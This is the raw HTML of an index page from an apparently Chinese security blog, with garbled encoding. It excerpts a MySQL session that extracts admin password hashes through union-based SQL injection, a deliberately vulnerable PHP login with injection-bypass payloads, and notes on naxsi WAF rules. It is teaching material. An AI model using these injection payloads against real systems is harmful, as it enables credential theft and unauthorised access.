<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> admin  <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> admin2 <span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span> admin3 <span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token operator">|</span> <span class="token number">3</span>     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token operator">|</span> id    <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




	
	</div>
  <a type="button" href="/2017/11/28/sql-bypass-unknown.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/11/23/order-by-blind.html" >åŸºäºorder byçš„ç›²æ³¨</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-11-23  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>æºä»£ç :</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
  $dbhost &#x3D; &quot;172.19.0.2&quot;;
  $dbuser &#x3D; &quot;root&quot;;
  $dbpass &#x3D; &quot;root&quot;;
  $db &#x3D; &quot;vul&quot;;
  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
  mysqli_set_charset($conn,&quot;utf8&quot;);
 
  &#x2F;* sql
 
     create  table &#96;admin&#96; (
        &#96;id&#96; int(10) not null primary key auto_increment,
        &#96;username&#96; varchar(20) not null ,
        &#96;password&#96; varchar(32) not null
     );
  *&#x2F;
function   filter($str)&#123;
      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
      if(preg_match($filterlist,strtolower($str)))&#123;
        die(&quot;illegal input!&quot;);
      &#125;
      return $str;
  &#125;
$username &#x3D; isset($_POST[&#39;username&#39;])?
filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
$password &#x3D; isset($_POST[&#39;password&#39;])?
filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
$sql &#x3D; &quot;select * from admin where  username &#x3D;
 &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
 
$res &#x3D; $conn -&gt; query($sql);
if($res-&gt;num_rows&gt;0)&#123;
  $row &#x3D; $res -&gt; fetch_assoc();
  if($row[&#39;id&#39;])&#123;
     echo $row[&#39;username&#39;];
  &#125;
&#125;else&#123;
   echo &quot;The content in the password column is the &quot;;
&#125;
 
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨ä¸Šé¢è¿™ä¸ªæºä»£ç é‡Œé¢ï¼Œè¦é¦–å…ˆçŒœè§£å‡ºusernameçš„å€¼ï¼Œæ–‡ç« é‡Œé¢ç»™çš„payloadæ˜¯</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å…¶å®ä¸Šé¢çš„payloadåˆçœ‹æ˜¯ä¸å¤ªæ‡‚çš„ï¼Œæ‰æƒ³èµ·æ¥mysqlé‡Œé¢å¼±ç±»å‹è½¬æ¢çš„é—®é¢˜ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="/2017/11/23/order-by-blind/2.png"></p>
<p>å°±æ˜¯sqlè¯­å¥æŸ¥è¯¢å¦‚æœusernameæ˜¯0çš„è¯ï¼Œæ‰€æœ‰ç»“æœå°±å‡ºæ¥äº†ï¼Œé‚£ä¹ˆæŠŠè¿™ä¸ªusernameå˜æˆ0ï¼Œä¸Šé¢çš„è¯­å¥éƒ½å¯ä»¥åšåˆ°ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
select * from admin where username&#x3D;&#39;&#39;&#x2F;2
select * from admin where username&#x3D;&#39;&#39;^1^1
select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åæ˜¯åŸºäºorder byçš„ç›²æ³¨ï¼š</p>
<p>é¦–å…ˆæ˜¯åŸºæœ¬çŸ¥è¯†:</p>
	

	</div>
  <a type="button" href="/2017/11/23/order-by-blind.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>æºä»£ç :</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
  $dbhost &#x3D; &quot;172.19.0.2&quot;;
  $dbuser &#x3D; &quot;root&quot;;
  $dbpass &#x3D; &quot;root&quot;;
  $db &#x3D; &quot;vul&quot;;
  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
  mysqli_set_charset($conn,&quot;utf8&quot;);
 
  &#x2F;* sql
 
     create  table &#96;admin&#96; (
        &#96;id&#96; int(10) not null primary key auto_increment,
        &#96;username&#96; varchar(20) not null ,
        &#96;password&#96; varchar(32) not null
     );
  *&#x2F;
function   filter($str)&#123;
      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
      if(preg_match($filterlist,strtolower($str)))&#123;
        die(&quot;illegal input!&quot;);
      &#125;
      return $str;
  &#125;
$username &#x3D; isset($_POST[&#39;username&#39;])?
filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
$password &#x3D; isset($_POST[&#39;password&#39;])?
filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
$sql &#x3D; &quot;select * from admin where  username &#x3D;
 &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
 
$res &#x3D; $conn -&gt; query($sql);
if($res-&gt;num_rows&gt;0)&#123;
  $row &#x3D; $res -&gt; fetch_assoc();
  if($row[&#39;id&#39;])&#123;
     echo $row[&#39;username&#39;];
  &#125;
&#125;else&#123;
   echo &quot;The content in the password column is the &quot;;
&#125;
 
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨ä¸Šé¢è¿™ä¸ªæºä»£ç é‡Œé¢ï¼Œè¦é¦–å…ˆçŒœè§£å‡ºusernameçš„å€¼ï¼Œæ–‡ç« é‡Œé¢ç»™çš„payloadæ˜¯</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å…¶å®ä¸Šé¢çš„payloadåˆçœ‹æ˜¯ä¸å¤ªæ‡‚çš„ï¼Œæ‰æƒ³èµ·æ¥mysqlé‡Œé¢å¼±ç±»å‹è½¬æ¢çš„é—®é¢˜ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="/2017/11/23/order-by-blind/2.png"></p>
<p>å°±æ˜¯sqlè¯­å¥æŸ¥è¯¢å¦‚æœusernameæ˜¯0çš„è¯ï¼Œæ‰€æœ‰ç»“æœå°±å‡ºæ¥äº†ï¼Œé‚£ä¹ˆæŠŠè¿™ä¸ªusernameå˜æˆ0ï¼Œä¸Šé¢çš„è¯­å¥éƒ½å¯ä»¥åšåˆ°ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
select * from admin where username&#x3D;&#39;&#39;&#x2F;2
select * from admin where username&#x3D;&#39;&#39;^1^1
select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åæ˜¯åŸºäºorder byçš„ç›²æ³¨ï¼š</p>
<p>é¦–å…ˆæ˜¯åŸºæœ¬çŸ¥è¯†:</p>
	
	</div>
  <a type="button" href="/2017/11/23/order-by-blind.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/11/02/naxsi.html" >naxsiçš„è§„åˆ™</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-11-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<ul>
<li>MainRule: å®šä¹‰æ£€æµ‹çš„è§„åˆ™å’Œåˆ†æ•°</li>
<li>BasicRule: å®šä¹‰MainRuleçš„ç™½åå•</li>
<li>CheckRule: å®šä¹‰å½“åˆ†å€¼è¾¾åˆ°é˜ˆå€¼é‡‡å–çš„åŠ¨ä½œ</li>
</ul>
<h3 id="Checkrules"><a href="#Checkrules" class="headerlink" title="Checkrules"></a>Checkrules</h3><p>CheckrulesæŒ‡ä»¤æœ‰å››ç§åŠ¨ä½œï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">LOG, BLOCK, DROP, ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ä½•æ—¶æ‰§è¡Œè¿™å››ç§åŠ¨ä½œï¼Ÿæ ¹æ®åˆ¶å®šçš„å¾—åˆ†(score)</p>
<p>####Basic Usage</p>
<pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$SQL &gt;&#x3D; 8&quot; BLOCK;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¦‚æœ<code>$SQL</code>å¤§äºç­‰äº8ï¼Œåˆ™<code>BLOCK</code>æ‰è¿™ä¸ªè¯·æ±‚ã€‚ï¼ˆå‰ææ˜¯æ‰“å¼€é˜²ç«å¢™çš„è¿‡æ»¤æ¨¡å¼ï¼Œè€Œä¸æ˜¯learningæ¨¡å¼ï¼‰</p>
<p>####Other Usages<br>çœ‹çœ‹å¦å¤–çš„ä¸€ç§ç”¨æ³•ï¼Œç™½åå•å’Œé»‘åå•ä¸€èµ·ç”¨çš„æ—¶å€™ï¼Œæ¯”å¦‚æœ‰è¿™æ ·çš„è§„åˆ™:</p>
<pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$UWA &gt;&#x3D; 4&quot; DROP;
CheckRule &quot;$XSS &gt;&#x3D; 8&quot; BLOCK;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/11/02/naxsi.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<ul>
<li>MainRule: å®šä¹‰æ£€æµ‹çš„è§„åˆ™å’Œåˆ†æ•°</li>
<li>BasicRule: å®šä¹‰MainRuleçš„ç™½åå•</li>
<li>CheckRule: å®šä¹‰å½“åˆ†å€¼è¾¾åˆ°é˜ˆå€¼é‡‡å–çš„åŠ¨ä½œ</li>
</ul>
<h3 id="Checkrules"><a href="#Checkrules" class="headerlink" title="Checkrules"></a>Checkrules</h3><p>CheckrulesæŒ‡ä»¤æœ‰å››ç§åŠ¨ä½œï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">LOG, BLOCK, DROP, ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ä½•æ—¶æ‰§è¡Œè¿™å››ç§åŠ¨ä½œï¼Ÿæ ¹æ®åˆ¶å®šçš„å¾—åˆ†(score)</p>
<p>####Basic Usage</p>
<pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$SQL &gt;&#x3D; 8&quot; BLOCK;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¦‚æœ<code>$SQL</code>å¤§äºç­‰äº8ï¼Œåˆ™<code>BLOCK</code>æ‰è¿™ä¸ªè¯·æ±‚ã€‚ï¼ˆå‰ææ˜¯æ‰“å¼€é˜²ç«å¢™çš„è¿‡æ»¤æ¨¡å¼ï¼Œè€Œä¸æ˜¯learningæ¨¡å¼ï¼‰</p>
<p>####Other Usages<br>çœ‹çœ‹å¦å¤–çš„ä¸€ç§ç”¨æ³•ï¼Œç™½åå•å’Œé»‘åå•ä¸€èµ·ç”¨çš„æ—¶å€™ï¼Œæ¯”å¦‚æœ‰è¿™æ ·çš„è§„åˆ™:</p>
<pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$UWA &gt;&#x3D; 4&quot; DROP;
CheckRule &quot;$XSS &gt;&#x3D; 8&quot; BLOCK;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/11/02/naxsi.html#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
     <a href="/page/8/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
      

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/10/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
		
			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
		
			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
		
			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
		
			<li><a href="/categories/Pentest/">Pentest<span>43</span></a></li>
		
			<li><a href="/categories/Python/">Python<span>5</span></a></li>
		
			<li><a href="/categories/SQL/">SQL<span>7</span></a></li>
		
			<li><a href="/categories/Tools/">Tools<span>2</span></a></li>
		
		</ul>
	</div>

		
			

		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>ä»Spring Boot H2 Databaseåˆ°Ge...</a>
      </li>
    
      <li>
        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLMç«¯å£ä¿¡æ¯æ¢æµ‹</a>
      </li>
    
      <li>
        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
      </li>
    
      <li>
        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silverè°ƒæŸ¥æŠ¥å‘Š</a>
      </li>
    
      <li>
        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuatoræ¼æ´å¤ç°</a>
      </li>
    
  </ul>
</div>

		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2022 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
